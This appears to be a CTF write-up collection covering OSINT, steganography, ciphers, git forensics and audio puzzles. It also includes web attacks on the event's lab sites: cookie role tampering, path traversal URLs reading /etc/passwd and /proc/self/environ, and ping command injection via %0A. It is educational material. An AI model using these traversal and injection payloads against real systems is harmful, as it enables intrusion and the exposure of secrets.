# Zahard's Welcome
The challenge begins with a mysterious description of the Citadel, hinting at a path that starts in a gathering place. The clue provided is a Discord invitation link. The goal is to locate the flag by exploring the server's channels.

## My solve

**Flag:** `citadel{7h3_c174d3l_b3ck0n5}`

1. The challenge provided a Discord server invite link: `https://discord.gg/FfBw8VzfRR`.
2. I joined the server and explored the various channels, focusing on sections like #rules.
3. Found the flag in the #rules channel, where important information is typically posted.

The challenge was straightforward once I followed the link and checked the right places.

## What I learned
- Following clues step-by-step is crucial, even when the solution seems simple.
- Familiarity with Discord's layout helps in quickly locating information.
- Thorough exploration and attention to detail are important in finding hidden information.



# The Social Network
In this challenge we need to find clues related to a legendary climber named "citadweller" The key to the next floor lies in tracing his activities on social media platforms. Starting with Instagram, we need to gather information and follow the trail of clues across platforms to find the flag.

## My Solve
**Flag:** `citadel{17_1s_jus7_7h3_b3g1nn1ng}`

1. I started by exploring the Instagram page `citadweller` as hinted in the challenge description.
2. Upon exploring the Instagram stories, I found the first part of the flag hidden in one of them in the image.
3. Alongside the first part, I discovered a clue that directed us to a Twitter page in the same image itself.
4. I then navigated to the mentioned Twitter account and found the second part of the flag.
5. By combining both parts, I was able to form the complete flag.

## What I Learned
- The importance of thorough OSINT investigations, especially on social media platforms like Instagram and Twitter.
- How to piece together fragmented clues from different sources to achieve the final objective.
- The value of attention to detail when analyzing publicly available information.



# Omniscient Flag's Metadata
In this challenge we were given with an image. I was mentioned that something is hidden in its layer or it means that somehting is been attached or compressed with it.

## My solve  
**Flag:** `citadel{th1s_ch4ll3ng3_1s_f0r_th4t_On3_ex1ft00l_4ndb1nw4lk_enthus14st}`  

1. We downloaded the given JPG file and noticed the challenge hinted at hidden metadata.  
2. We searched online for an Exif tool and found a useful one to inspect the image's metadata.  
3. Upon checking the metadata, we found a clue in the author name field suggesting another image was hidden inside that is `kdj had a habit of hiding images within images`.
4. We then searched for an extractor that can find hidden files and we found the online binwalk extractor.  
5. Uploaded the image to binwalk tool, which provided a bin file named `extracted_1759816505943.bin` with extracted layers.  
6. So after some hit and trials and renamed it with `.png` format, we found a PNG image that had the flag written on it.

## What I learned  
Learnt the use of exif tools to extract metadata and binwalk tools to uncover hidden layers in images. 

## References  
- Used [exif tools](https://exif.tools/) to search image metadata.
- Used online [binwalk tool](https://www.unroll.ing/) to extract the file.
- Also tried with another tool after the CTF was over with [AperiSolve](https://aperisolve.fr/)



# track 8
The challenge involves decrypting a cipher found on an old MP3 player. The cipher is:   
```twj eys zpr ukm 'viamnwqw' bx lzgo: esmqqui{yyr_oshwwcm_bwupa}```.  
The song playing is from Panchiko's latest album and we have to use album name to decrypt and to retrieve our flag.

## My solve
**Flag:** `citadel{add_vinegar_twice}`
1. We identified the album name as `Ginkgo` by searching `Panchiko’s` latest studio album.
2. We found that the 8th track was `Vinegar` from this [site](https://panchiko.bandcamp.com/album/ginkgo), suggesting the Vigenère cipher(we dont know it, I just googled vinegar decode).
3. Used a Vigenère decoder with key "Ginkgo" on the cipher. The output was:
    ```
    now use the key 'panchiko' on flag: rigckmv{osd_ikumqog_tjkjm}
    ```
4. So we used `rigckmv{osd_ikumqog_tjkjm}` and decrypted it again using "PANCHIKO" as the key.
5. Thus we got the final flag whcih says we used vinegar twice (as obvious).

## What I learned
- Learned about the Vigenère cipher and its application in decryption. Got definition from google `A cipher is a set of rules or an algorithm used in cryptography to encrypt (scramble) and decrypt (unscramble) information.`
- Understood the use of double encryption with different keys in this challenge.

## References
- Used [Vigenere Cipher Decoder tool](https://cryptii.com/pipes/vigenere-cipher)
- Google to see what it is and its definition.



# Test of Sweetness
The challenge requires finding a way to elevate the user's access level to become an admin and unlock the door.

## My solve
**Flag:** `citadel{fru1tc4k3_4nd_c00k13s}`

1. The challenge provided a link to a website, and our goal was to gain admin access.
2. First, we right-clicked and inspected the page to look for hidden clues in the source code or developer tools.
3. We then explored every tab in the developer tools, including Elements, Console, Network, and Application, but nothing obvious stood out at first.
4. After some time and frustration, we noticed a hint in the question about `session memory flicker` and we realized it might refer to cookies, as session data is often stored there.
5. We checked the cookie data under the `Application` tab and found a user-level cookie.
6. By editing this cookie and changing its value from `user` to `admin`, we elevated our access level.
7. Refreshing the page after the change granted us admin access, and we retrieved the flag.

## What I learned
- This challenge taught me that session cookies can sometimes be manipulated to change a users access level on a website like this.
- If a website stores user roles in cookies without proper validation, it can be vulnerable to such attacks.

## References
- https://testofsweetness.citadel.cryptonitemit.in/ which is the site itself.
- Googled a bit to see how can we change cookies.




# Rotten Apple
The challenge involves decrypting a string that has been encrypted using two rotation ciphers. The string `4:R256=Y3oRRoP0#~%Ro?A` has been warped first by ROT47 and then by ROT13.

## My Solve
**Flag:** `citadel{b3tt3r_ROTt3n}`
1. We identified that `warped by factors of 47 and 13` referred to ROT47 and ROT13 ciphers.
2. Understanding that the encryption was ROT47 followed by ROT13
3. So I did ROT47 first then ROT13 and i found that it was wrong.
4. Then we decided to decrypt by reversing the process. First, we applied ROT13 to the encrypted string using an online tool, resulting in the intermediate string: `4:E256=L3bEEbC0#~%Eb?N`.
5. Next, we applied ROT47 to this intermediate string, which decrypted it to the final flag.

- The tricky part was understanding that "warped" meant applying ROT ciphers, but hints like "disc rot" pointed us in the right direction.
- Also since the string was warped first by ROT47 and then by ROT13, thus for decryption we have to reverse the order.

## What I Learned
Learned about ROT ciphers, specifically ROT13 and ROT47, and how reversing the encryption process requires applying the ciphers in the opposite order.

## References

- [ROT13 Tool](https://rot13.com/)
- [ROT47 Tool](https://www.dcode.fr/rot-47-cipher)
- Afterwards when retrying the solution i used this [ROT tool](https://www.cachesleuth.com/rot.html) which has all the ROT tools included.




# Randomly Accessed Memories  
This challenge involves analyzing a GitHub repository to uncover hidden information. The repository contains cryptic commits related to Daft Punk's music and is intertwined with git commands. The task is to find specific missing commits and decode base64 encoded data to retrieve the flag.

## My Solve  
**Flag:** `citadel{w3_4r3_up_4ll_n1t3_t0_g1t_lucky}`
1. We started the challenge by opening the provided GitHub link and cloned the repository to our local machine.  
2. Upon examining the files, We noticed that the "notes" files didn't contain any relevant information.  
3. We then opened the `changes` file and noticed that commits 56, 122, and 279 were missing from the list.  
4. We decided to look through the commit history using `git log` and found that the commits were scattered and not in order.  
5. After scrolling through the commit history, We found a commit titled `Add secret chunk 3 (base64)` with commit hash 279.
6. We searched for the other missing commits and found that each contained a base64 encoded message.
7. Then, the next problem was that we had to convert the base 64 encoded data into the flag. We simply went into a base64 encoder and decoder software and pasted the three encoded statements. 
8. Decoding the messages revealed the flag.

## What I Learned  
- I learned about the importance of understanding git commit history and how to navigate through it.  
- I gained practical experience with base64 encoding and decoding.  
- I realized the significance of attention to detail when looking for anomalies like missing commit numbers.  

## References  
- [Base 64 Decode Tool](https://www.base64decode.org/) - Used for decoding the base64 encoded messages.





# Selected Ambient Work
The challenge provides us with an audio file with a hidden message. The task is to uncover the secret message embedded in the audio, despite background music noises and distortion it. The flag should be formatted with uppercase words separated by underscores.

## My Solve  
**Flag:** `citadel{1_LOV3_1DM}`
1. We started by analyzing the provided audio file, recognizing it contained Morse code with distorted background music and the background music was extremely loud and made it hard to distinguish the actual Morse beeps.
2. To remove these distortion, we went to Analyze → Plot Spectrum to inspect the frequency components of the audio. This allowed us to determine the peak frequency of the Morse beeps, which turned out to be around 1000 Hz.
3. Once we identified the frequency, we began filtering out the unwanted noise. We applied a High-Pass Filter(val=990 HZ) to remove the low-frequency background elements, followed by a Low-Pass Filter(1010 HZ) to eliminate the higher-frequency background sounds, leaving only the midrange tone of the beeps. After filtering, we performed amplification to make the Morse tones clearer and more prominent compared to the background audio.
4. After filtering, we amplified the beeps to make them clearer and exported the cleaned audio.
5. Then we used online Morse code decoder, revealing the message about Aphex Twin and the hidden flag phrase. In between the code shows the `citadel{` and after some seconds `}`.
    ```
    RICHARD D JAMES AKA APHEX TWIN IS A BRITISH MUSICIAN, COMPOSER AND DJ ACTIVE IN ELECTRONIC MUSIC SINCE 1988 1 L0V3 1DM AND IS A 
    PIONEERING FIGURE IN THE INTELLIGENT DANCE MUSIC IDM GENRE.
    ```
5. That showed we have to extract only that part of the text as flag.

We first noticed that:
Most of the text was an informative description about Aphex Twin, a famous electronic musician, but one segment clearly stood out — “1 L0V3 1DM” — which didn’t fit naturally with the rest of the text. This unusual phrase was the actual flag for the challenge.

## What I Learned  
This challenge taught me how to process audio to isolate specific frequencies and decode hidden Morse code messages.

## References  
- I downloaded Audacity from [link](https://www.audacityteam.org/).
- I used this online [Morse decoder tool](https://databorder.com/transfer/morse-sound-receiver/).



# The Robot's Trail
The challenge requires patience and careful observation to trace the robot's movements and find the key. The challenge involves exploring the maze, analyzing clues, and using problem-solving skills to reach the final destination.

## My Solve
**Flag:** `citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}`
1. I started by clicking the link in the challenge description, which led me to a page with five clickable decoy files. All of them directed me to the same dead end.
   
2. After exploring the visible UI without success, we opened the browser's DevTools and inspected the page source.

3. Hidden in the DOM, I found this snippet:
   ```html
   <div class="hidden">
     <p>Start by checking what this site tells search engine bots in <a href="/robots.txt" style="color: #00bcd4;">robots.txt</a></p>
   </div>
   ```
   This pointed me to `https://therobotstrail.citadel.cryptonitemit.in/robots.txt`.

4. The robots.txt file contained a hint.
   ```
   Hint for curious explorers:
   
   Sometimes system files like /etc/passwd can reveal interesting information
   ```

5. Following the hint, I tried the file viewer endpoint with `/etc/passwd`:
   ```bash
   https://therobotstrail.citadel.cryptonitemit.in/file?path=/etc/passwd
   ```
   The page gave another hint, leading me to check `/var/www/html/config.php`.

6. Loading the config file:
   ```bash
   https://therobotstrail.citadel.cryptonitemit.in/file?path=/var/www/html/config.php
   ```
   Another clue pointed to the webserver logs.

7. I checked the logs at:
   ```bash
   https://therobotstrail.citadel.cryptonitemit.in/file?path=/var/log/apache2/access.log
   ```
   A subsequent hint mentioned environment variables.

8. I fetched the environment variables at:
   ```bash
   https://therobotstrail.citadel.cryptonitemit.in/file?path=/proc/self/environ
   ```
   Inside, I discovered an environment entry:
   ```
   SECRET_LOCATION=/home/ctf/.secret
   ```

9. This led me to:
   ```bash
   https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret
   ```
   The directory listing showed:
   ```
   Directory listing for /home/ctf/.secret:
   total 12
   drwx------ 2 ctf ctf 4096 Jan 1 10:00 .
   drwxr-xr-x 5 ctf ctf 4096 Jan 1 09:55 ..
   -r-------- 1 ctf ctf 48 Jan 1 10:00 flag.txt
   ```

10. I opened the final file:
    ```bash
    https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret/flag.txt
    ```
    And retrieved the flag.

## What I Learned
I learned patience and the importance of thoroughly exploring all possible clues.




# Rotting In The Deep

The challenge provides a cryptic message on a chamber floor with a sequence of numbers and a hint about reversing a transformation. The task is to decode the given output by reversing a digit-wise Caesar cipher applied to the flag. Each digit in the flag has been shifted 3 steps forward, and we need to shift them back to retrieve the original message.

## My Solve

**Flag:** `citadel{br0_r34lly_unr0tt3d_m3_b4ck_t0_l1f3}`

1. The provided Python script (`chal.py`) shifts each digit of the flag by 3 positions forward using modulo 10. The output is a long string of digits in `out.txt`.

2. To retrieve the original flag, each digit in the output string needs to be shifted back by 3 positions.

3. The `long_to_bytes` function from the `Crypto.Util.number` module is necessary. So we installed the package using `pip install pycryptodome` so that we can run it locally.
    ```python
    from Crypto.Util.number import long_to_bytes

    out = "6895840967002953721051398351211751734500850509315790892845302801984496338433523326225010635779036738800318"
    KEY = 3

    decoded_digits = ""
    for d in out:
        decoded_digits += str((int(d) - KEY) % 10)

    num = int(decoded_digits)
    flag = long_to_bytes(num)
    print(flag)

    ```
4. Thus the output was
    ```
    b'citadel{br0_r34lly_unr0tt3d_m3_b4ck_t0_l1f3}'
    ```

This code processes each digit, shifts it back by 3, reconstructs the number, and converts it back to the original bytes. So we get our flag by directly running it in VS Code.

## What I Learned
- This challenge taught me about reversing digit-wise ciphers and using the `long_to_bytes` function. 
- It taught us about ciphers and understanding encoding and decoding processes.

## References
- Searched for `long_to_bytes` usage.
- Explored reversing number shifting techniques with ChatGPT guidance and google guidance.



# Coco Conjecture
The challenge is about solving a mathematical problem presented by "the dragon CEO". The problem is related to the Collatz Conjecture, where we need to determine the number of steps required to reduce a given number to 1 using the conjecture's rules. The goal is to automate this process and communicate with a remote server to get the flag.


## My Solve
**Flag:** `citadel{k1ryu_c0c0_h4s_4_g0_4t_4n_uns0lv3d_m4th3m4t1cs_pr0bl3m}`

1. So we identified that the problem was based on Collatz Conjecture after some research on Google.
2. Using the provided `helper.md` and a PDF explaining the conjecture, we created a Python script to communicate with the remote server.
3. The script uses `pwntools` to establish a connection and receive numbers from the server.
4. For each number received, the Collatz steps were calculated as it was instructed in the pdf.
   - If the number is even, it is divided by 2.
   - If the number is odd, it is multiplied by 3 and incremented by 1.
5. The count of steps to reach 1 is sent back to the server.(we have to exclude the starting value count)
6. The script continues this process until the flag is received.(Till all the test cases matches...)
    ```python
    from pwn import remote
    import re

    r = remote("127.0.0.1", 420)
    while True:
        line = r.recvline(timeout=10)
        if not line:
            break
        msg = line.decode().strip()
        print(msg)
        m = re.search(r"Round \d+: (\d+)", msg)
        if m:
            n = int(m.group(1))
            count = 0
            while n != 1:
                if n % 2 == 0:
                    n //= 2
                    count += 1
                else:
                    n = 3 * n + 1
                    count += 1
            r.sendline(str(count))
            print("-> sent:", count)
        elif "citadel{" in msg:
            break
    r.close()
    ```
7. So in output there were many test cases and numbers that were checked after all it gave us with the flag.

## What I Learned

- The Collatz Conjecture is a fundamental problem in mathematics where we need to reduce any positive integer to 1 using specific rules.
- Automating tasks involving network communication or to connect and communicate to a server can be done using tools like `pwntools`.(or socket which we have not used)
- We learned how to write a code by going throught the syntax.

## References
- Google for identifying the problem as the Collatz Conjecture.
- ChatGPT and google for syntax help with the Python script.
- `Helper.md` file for instructions on connecting to the remote server.
- PDF file explaining the logic behind the Collatz Conjecture.



# Schlagenheim
The challenge gives us a corrupted WAV file containing a hidden passcode needed to unlock the next challenge. The file, though named `.wav`, is scrambled. The task is to repair this file to extract the passcode.

## My Solve

**Flag:** `citadel{8lackM1D1wa5c00l}`

1. I opened the WAV file on Windows, which didn't work.
2. So I searched on google and found the `xxd` command to view the hex dump. So i wrote in shell `xxd -l 16 mysong.wav` to view the hex dump, revealing bytes starting with `4d31 4431`.
3. So i was just looking and found there that M1D1 was written in hex. After searching, I found that the file might be a MIDI since MIDI headers start with `4D 54 68 64`. I then changed them using an online hex editor to resemble a MIDI header.
    ```
    4D 31 44 31  -> M1D1
    4D 54 68 64  -> MThd
    ```
4. Then I imported the edited `.mid` file into Audacity, where the flag appeared in the audio data.

## What I Learned
- File headers like WAV and MIDI can be identified using hex dumps. A correct header is crucial for proper file recognition.
- Tools like `xxd` and hex editors are essential for diagnosing and correcting file issues.
- MIDI files store musical notes, which can hide text messages.

## References
- Google for MIDI structure and xxd usage.
- [hexed.it](https://hexed.it/) for hex editing.
- Audacity for MIDI playback and analysis.



# The Sound of Music
The challenge required participants to track the digital footprints of a user named `citadweller` across various music platforms. The goal was to find three segments of a flag hidden on these platforms, which when combined would reveal the complete flag. This challenge tested OSINT focusing on the ability to gather information from public profiles and links shared by the user.

## My Solve
**Flag:** `citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n_n_started_shar1ng_st0r1es_n_then_they_were_n0where_t0_be_f0und}`

1. I began by searching for `citadweller` on music platforms where users typically post album ratings and listening history. 
2. I found a RateYourMusic profile at [https://rateyourmusic.com/~citadweller](https://rateyourmusic.com/~citadweller), where the second part of the flag was hidden: `_n_started_shar1ng_st0r1es`.
3. On the same profile, there was a link to a Spotify account. Upon exploring the public playlist, I found the third part of the flag in the playlist description: `_n_then_they_were_n0where_t0_be_f0und`.
4. I continued the search and discovered a Last.fm profile at [https://www.last.fm/user/citadweller](https://www.last.fm/user/citadweller). In the shoutbox section, the first part of the flag was located: `citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n}`.
5. By combining all three parts, I reconstructed the complete flag.

## What I Learned
- This challenge taught me the importance of thoroughly investigating multiple platforms when conducting OSINT.
- I also learned that persistence is key in tracking digital footprints as clues can be hidden in any unrelated places.

## References
- [RateYourMusic](https://rateyourmusic.com)
- [Spotify](https://www.spotify.com)
- [Last.fm](https://www.last.fm)






# AetherCorp NetprobeX
This challenge required us to uncover a hidden backdoor in the NetProbeX system, a remnant of the former AetherCorp. The task involved analyzing logs and exploiting vulnerabilities to retrieve a passcode. The engineers left subtle hints in the logs, which we had to decipher to progress. Our goal was to find and exploit this backdoor to get the flag.

## My solve
**Flag:** `citadel{bl4ck51t3_4cc3ss_gr4nt3d}`

1. Initially, I was unsure what to do, so I started by testing the input field with the placeholder text provided. I entered `8.8.8.8` in the textbox, which triggered a ping command. Here is the response I received:

   ```bash
   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
   64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.90 ms
   64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=3.85 ms
   64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.95 ms
   64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.96 ms

   --- 8.8.8.8 ping statistics ---
   4 packets transmitted, 4 received, 0% packet loss, time 3005ms
   rtt min/avg/max/mdev = 3.845/3.913/3.961/0.046 ms
   ```

2. I tried entering other commands like `ls` but received an error: `ping: ls: No address associated with hostname`. This indicated that the system was interpreting my input as part of the ping command and not executing shell commands directly.

3. I then searched on google to find something so that we can write it without any error. I got to know about using `%0A` to inject multiple commands. I tested this by entering `8.8.8.8%0A ls`:

   ```bash
   Executing: ping -c 4 8.8.8.8%0A ls

   PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
   64 bytes from 8.8.8.8: icmp_seq=1 ttl=112 time=3.82 ms
   64 bytes from 8.8.8.8: icmp_seq=2 ttl=112 time=4.00 ms
   64 bytes from 8.8.8.8: icmp_seq=3 ttl=112 time=3.97 ms
   64 bytes from 8.8.8.8: icmp_seq=4 ttl=112 time=3.97 ms

   --- 8.8.8.8 ping statistics ---
   4 packets transmitted, 4 received, 0% packet loss, time 3004ms
   rtt min/avg/max/mdev = 3.818/3.938/4.000/0.070 ms
   app.py
   mission_briefing.txt
   requirements.txt
   templates
   ```

   This revealed several files, including `mission_briefing.txt`.

4. I tried reading the contents of `mission_briefing.txt` using `more` (since `cat` wasn't working, so i searched on google to find any alternatives of `cat`) with the command `8.8.8.8%0A more mission_briefing.txt`:

   ```
   ================= OPERATION: SILENT ECHO =================
                   CLASSIFICATION: BLACK ICE

   Agent, your objective is to recover the Blacksite Key.
   Our intel confirms it’s hidden deep within the AetherCorp network.
   =========================================================
   ```

   The file hinted at a hidden key deep within the network.

5. I used the `find` command to locate directories related to AetherCorp or Aether. So i used the `file` command to search the location of the folder if it exists from the root directory:

   ```bash
   8.8.8.8%0A find / -name aethercorp
   ```

   This returned `/var/lib/aethercorp` as the only accessible folder with no permission constraints.

6. Exploring further i listed further and then after some more hit and trials found the `archive` folder and I found a hidden `.secrets` directory within `/var/lib/aethercorp/archive` using:

   ```bash
   8.8.8.8%0A ls /var/lib/aethercorp/archive -a
   ```

   Inside the `.secrets` directory was a file called `blacksite_key.dat`.

7. Finally, I viewed the contents of `blacksite_key.dat` using:

   ```bash
   8.8.8.8%0A more /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
   ```

   This revealed the flag.
   ```bash
   4 packets transmitted, 4 received, 0% packet loss, time 3003ms
   rtt min/avg/max/mdev = 3.918/3.966/4.015/0.038 ms
   ::::::::::::::
   /var/lib/aethercorp/archive/.secrets/blacksite_key.dat
   ::::::::::::::
   citadel{bl4ck51t3_4cc3ss_gr4nt3d}
   ```

## What I learned

This challenge taught me about:

- Command Injection using `%0A` to chain commands in restricted environments.
- Alternative File Viewing using tools like `more` or `less` when `cat` is unavailable or not allowed.
- Navigating through system directories to uncover hidden files and folders.
- Understanding how to interpret subtle hints left behind in logs.

## References

- Google for command injection techniques and alternative file viewing methods.
- ChatGPT for syntax and command structures.